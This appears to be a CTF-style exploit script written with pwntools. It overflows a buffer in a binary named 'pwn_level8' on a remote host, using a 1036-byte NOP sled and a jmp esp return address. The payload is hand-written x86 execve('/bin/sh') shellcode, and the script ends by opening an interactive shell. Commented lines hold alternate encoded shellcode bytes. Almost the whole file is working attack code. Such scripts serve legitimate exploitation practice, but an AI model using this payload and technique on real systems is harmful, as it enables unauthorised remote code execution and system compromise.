#!/usr/bin/env python

from pwn import *

def main():

    offset = 1036
    jmpesp = p32(0x8048631)
    #print shell
    shell = """/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push 0x8/* 0xb */
    pop eax
    inc eax
    inc eax
    inc eax
    int 0x80
    """

    #shell = shellcraft.i386.linux.sh()
    #print shell
    shellcode = asm(shell, arch='x86')
    #shellcode =  b""
    #shellcode += b"\xbe\x8c\x9d\x84\x53\xda\xc4\xd9\x74\x24\xf4"
    #shellcode += b"\x58\x31\xc9\xb1\x0b\x31\x70\x15\x03\x70\x15"
    #shellcode += b"\x83\xc0\x04\xe2\x79\xf7\x8f\x0b\x18\x5a\xf6"
    #shellcode += b"\xc3\x37\x38\x7f\xf4\x2f\x91\x0c\x93\xaf\x85"
    #shellcode += b"\xdd\x01\xc6\x3b\xab\x25\x4a\x2c\xa3\xa9\x6a"
    #shellcode += b"\xac\x9b\xcb\x03\xc2\xcc\x78\xbb\x1a\x44\x2c"
    #shellcode += b"\xb2\xfa\xa7\x52"
    #avoid='\x00'
    #encoded = pwnlib.encoders.encoder.encode(shellcode, avoid)
    #print encoded
    payload = '\x90'*offset + jmpesp + shellcode

    conn = remote('linux-pwn', 10008)
    #conn = process('./pwn_level8')
    #gdb.attach(conn, "b* greet+113")
    print conn.recvuntil('name?')
    conn.sendline(payload)
    conn.recv()
    conn.interactive()
    conn.close()

main()
